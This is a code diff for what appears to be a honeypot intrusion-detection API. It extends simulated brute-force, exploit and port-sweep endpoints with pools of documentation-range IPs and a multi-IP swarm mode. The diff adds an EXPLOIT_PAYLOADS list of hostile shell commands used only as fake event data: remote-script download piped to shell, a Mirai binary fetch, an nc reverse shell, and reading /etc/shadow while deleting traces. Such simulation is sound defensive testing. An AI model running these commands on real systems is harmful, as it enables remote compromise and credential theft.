@@ -1,9 +1,11 @@
 import asyncio
+import ipaddress
 import logging
+import random
 import time
-from typing import Any, AsyncGenerator, Dict, Optional
+from typing import Any, AsyncGenerator, Dict, List, Optional, Tuple
 
-from fastapi import APIRouter, HTTPException, Request, Response
+from fastapi import APIRouter, Body, HTTPException, Request, Response
 from fastapi.responses import StreamingResponse
 from pydantic import BaseModel, Field
 
@@ -16,10 +18,77 @@ logger = logging.getLogger(__name__)
 
 router = APIRouter(prefix="/api")
 
+# Curated multi-IP pools using RFC 5737 TEST-NET documentation ranges
+ATTACK_IP_POOLS: Dict[str, List[str]] = {
+    "brute-force": [
+        "198.51.100.99",
+        "198.51.100.142",
+        "198.51.100.205",
+        "203.0.113.45",
+        "192.0.2.81",
+    ],
+    "exploit": [
+        "203.0.113.88",
+        "203.0.113.154",
+        "203.0.113.219",
+        "198.51.100.175",
+        "192.0.2.114",
+    ],
+    "port-sweep": [
+        "198.51.100.77",
+        "198.51.100.188",
+        "192.0.2.63",
+        "203.0.113.92",
+        "192.0.2.199",
+    ],
+}
+
+EXPLOIT_PAYLOADS: Tuple[str, ...] = (
+    "curl -s http://malicious.payload/botnet.sh | sh",
+    "wget http://malicious.payload/mirai.arm7 -O /tmp/m && chmod +x /tmp/m",
+    "nc -e /bin/sh 192.0.2.55 4444",
+    "cat /etc/shadow && rm -rf /tmp/traces",
+    "wget http://198.51.100.10/loader.sh -O - | /bin/bash",
+)
+
 
 class UnbanRequest(BaseModel):
     ip: str = Field(..., description="Target IPv4 or IPv6 address to unban")
     admin_user: Optional[str] = Field("soc_admin", description="Identity executing the unban action")
+
+
+class AttackSimulationRequest(BaseModel):
+    src_ip: Optional[str] = Field(None, description="Optional explicit attacker IPv4 or IPv6 address")
+    mode: str = Field("single", description="Simulation mode: 'single', 'random', or 'swarm'")
+
+
+def _resolve_simulation_targets(
+    attack_type: str,
+    payload: Optional[AttackSimulationRequest],
+) -> Tuple[List[str], str]:
+    """Resolves attacker IP(s) from explicit input, random pool selection, or swarm mode."""
+    pool = ATTACK_IP_POOLS[attack_type]
+    if payload is None:
+        return [pool[0]], "single"
+
+    mode = (payload.mode or "single").strip().lower()
+    if mode not in {"single", "random", "swarm"}:
+        raise HTTPException(status_code=400, detail=f"Unsupported simulation mode: '{payload.mode}'")
+
+    if mode == "swarm":
+        return list(pool), "swarm"
+    if mode == "random":
+        return [random.choice(pool)], "random"
+
+    if payload.src_ip:
+        candidate = payload.src_ip.strip()
+        try:
+            normalized_ip = str(ipaddress.ip_address(candidate))
+        except ValueError as exc:
+            raise HTTPException(status_code=400, detail=f"Invalid IP address '{candidate}': {exc}") from exc
+        return [normalized_ip], "single"
+
+    return [pool[0]], "single"
 
 
 def make_response(
@@ -211,84 +280,153 @@ async def restore_node_container(node_id: str, request: Request) -> Dict[str, An
     return make_response(data=res, message=f"Container {node_id} restored to production.")
 
 
+@router.get("/simulate/attack/pools")
+async def get_attack_ip_pools() -> Dict[str, Any]:
+    """Returns curated attacker IP pools available for each simulation vector."""
+    return make_response(data=ATTACK_IP_POOLS)
+
+
+async def _emit_threshold_attack(
+    detector: IntrusionDetector,
+    broadcaster: SSEBroadcaster,
+    target_ips: List[str],
+    eventid: str,
+    attempts_per_ip: int = 5,
+) -> int:
+    """Broadcasts and evaluates repeated threshold attack events across one or more attacker IPs."""
+    events_triggered = 0
+    delay = 0.02 if len(target_ips) > 1 else 0.05
+
+    for attacker_ip in target_ips:
+        for i in range(attempts_per_ip):
+            if eventid == "cowrie.login.failed":
+                event = CowrieEvent(
+                    eventid=eventid,
+                    src_ip=attacker_ip,
+                    timestamp=time.time(),
+                    username="root",
+                    password=f"admin_pass_{i}",
+                    message=f"login attempt [root/admin_pass_{i}] failed",
+                    raw_data={"simulated": True},
+                )
+            else:
+                event = CowrieEvent(
+                    eventid=eventid,
+                    src_ip=attacker_ip,
+                    timestamp=time.time(),
+                    message=f"Remote SSH version: SSH-2.0-Attacker_Probe_{i}",
+                    raw_data={"simulated": True},
+                )
+            await broadcaster.broadcast("honeypot_hit", event.to_dict())
+            detector.process_event(event)
+            events_triggered += 1
+            await asyncio.sleep(delay)
+
+    return events_triggered
+
+
 @router.post("/simulate/attack/brute-force")
-async def trigger_simulated_bruteforce(request: Request) -> Dict[str, Any]:
-    """Triggers an automated credential brute-force attack simulation on demand."""
+async def trigger_simulated_bruteforce(
+    request: Request,
+    payload: Optional[AttackSimulationRequest] = Body(default=None),
+) -> Dict[str, Any]:
+    """Triggers a credential brute-force simulation for a selected, random, custom, or swarm IP set."""
     detector = get_detector(request)
     broadcaster = get_broadcaster(request)
-    attacker_ip = "198.51.100.99"
-    events_triggered = 0
+    target_ips, mode = _resolve_simulation_targets("brute-force", payload)
 
-    for i in range(5):
-        event = CowrieEvent(
-            eventid="cowrie.login.failed",
-            src_ip=attacker_ip,
-            timestamp=time.time(),
-            username="root",
-            password=f"admin_pass_{i}",
-            message=f"login attempt [root/admin_pass_{i}] failed",
-            raw_data={"simulated": True}
-        )
-        await broadcaster.broadcast("honeypot_hit", event.to_dict())
-        detector.process_event(event)
-        events_triggered += 1
-        await asyncio.sleep(0.05)
+    events_triggered = await _emit_threshold_attack(
+        detector=detector,
+        broadcaster=broadcaster,
+        target_ips=target_ips,
+        eventid="cowrie.login.failed",
+    )
+    protected = [ip for ip in target_ips if detector.allowlist.is_ip_protected(ip)]
+    ip_summary = ", ".join(target_ips)
 
     return make_response(
-        data={"target_ip": attacker_ip, "events_sent": events_triggered},
-        message=f"Brute-force attack simulation completed for IP {attacker_ip}."
+        data={
+            "target_ip": target_ips[0],
+            "target_ips": target_ips,
+            "mode": mode,
+            "events_sent": events_triggered,
+            "allowlist_protected": protected,
+        },
+        message=f"Brute-force attack simulation ({mode}) completed for {ip_summary}.",
     )
 
 
 @router.post("/simulate/attack/exploit")
-async def trigger_simulated_exploit(request: Request) -> Dict[str, Any]:
-    """Triggers a critical remote shell exploit simulation on demand."""
+async def trigger_simulated_exploit(
+    request: Request,
+    payload: Optional[AttackSimulationRequest] = Body(default=None),
+) -> Dict[str, Any]:
+    """Triggers a critical remote shell exploit simulation for a selected, random, custom, or swarm IP set."""
     detector = get_detector(request)
     broadcaster = get_broadcaster(request)
-    attacker_ip = "203.0.113.88"
-    cmd = "curl -s http://malicious.payload/botnet.sh | sh"
+    target_ips, mode = _resolve_simulation_targets("exploit", payload)
+    commands_used: List[str] = []
 
-    event = CowrieEvent(
-        eventid="cowrie.command.input",
-        src_ip=attacker_ip,
-        timestamp=time.time(),
-        input_command=cmd,
-        message=f"CMD: {cmd}",
-        raw_data={"simulated": True}
-    )
-    await broadcaster.broadcast("honeypot_hit", event.to_dict())
-    detector.process_event(event)
+    for idx, attacker_ip in enumerate(target_ips):
+        cmd = EXPLOIT_PAYLOADS[idx % len(EXPLOIT_PAYLOADS)]
+        commands_used.append(cmd)
+        event = CowrieEvent(
+            eventid="cowrie.command.input",
+            src_ip=attacker_ip,
+            timestamp=time.time(),
+            input_command=cmd,
+            message=f"CMD: {cmd}",
+            raw_data={"simulated": True},
+        )
+        await broadcaster.broadcast("honeypot_hit", event.to_dict())
+        detector.process_event(event)
+        if len(target_ips) > 1:
+            await asyncio.sleep(0.03)
+
+    protected = [ip for ip in target_ips if detector.allowlist.is_ip_protected(ip)]
+    ip_summary = ", ".join(target_ips)
 
     return make_response(
-        data={"target_ip": attacker_ip, "command": cmd},
-        message=f"Terminal exploit simulation completed for IP {attacker_ip}."
+        data={
+            "target_ip": target_ips[0],
+            "target_ips": target_ips,
+            "mode": mode,
+            "command": commands_used[0],
+            "events_sent": len(target_ips),
+            "allowlist_protected": protected,
+        },
+        message=f"Terminal exploit simulation ({mode}) completed for {ip_summary}.",
     )
 
 
 @router.post("/simulate/attack/port-sweep")
-async def trigger_simulated_port_sweep(request: Request) -> Dict[str, Any]:
-    """Triggers a rapid port reconnaissance sweep simulation on demand."""
+async def trigger_simulated_port_sweep(
+    request: Request,
+    payload: Optional[AttackSimulationRequest] = Body(default=None),
+) -> Dict[str, Any]:
+    """Triggers a rapid port reconnaissance sweep simulation for a selected, random, custom, or swarm IP set."""
     detector = get_detector(request)
     broadcaster = get_broadcaster(request)
-    attacker_ip = "198.51.100.77"
-    events_triggered = 0
+    target_ips, mode = _resolve_simulation_targets("port-sweep", payload)
 
-    for i in range(5):
-        event = CowrieEvent(
-            eventid="cowrie.client.version",
-            src_ip=attacker_ip,
-            timestamp=time.time(),
-            message=f"Remote SSH version: SSH-2.0-Attacker_Probe_{i}",
-            raw_data={"simulated": True}
-        )
-        await broadcaster.broadcast("honeypot_hit", event.to_dict())
-        detector.process_event(event)
-        events_triggered += 1
-        await asyncio.sleep(0.05)
+    events_triggered = await _emit_threshold_attack(
+        detector=detector,
+        broadcaster=broadcaster,
+        target_ips=target_ips,
+        eventid="cowrie.client.version",
+    )
+    protected = [ip for ip in target_ips if detector.allowlist.is_ip_protected(ip)]
+    ip_summary = ", ".join(target_ips)
 
     return make_response(
-        data={"target_ip": attacker_ip, "events_sent": events_triggered},
-        message=f"Reconnaissance sweep simulation completed for IP {attacker_ip}."
+        data={
+            "target_ip": target_ips[0],
+            "target_ips": target_ips,
+            "mode": mode,
+            "events_sent": events_triggered,
+            "allowlist_protected": protected,
+        },
+        message=f"Reconnaissance sweep simulation ({mode}) completed for {ip_summary}.",
     )
 
 
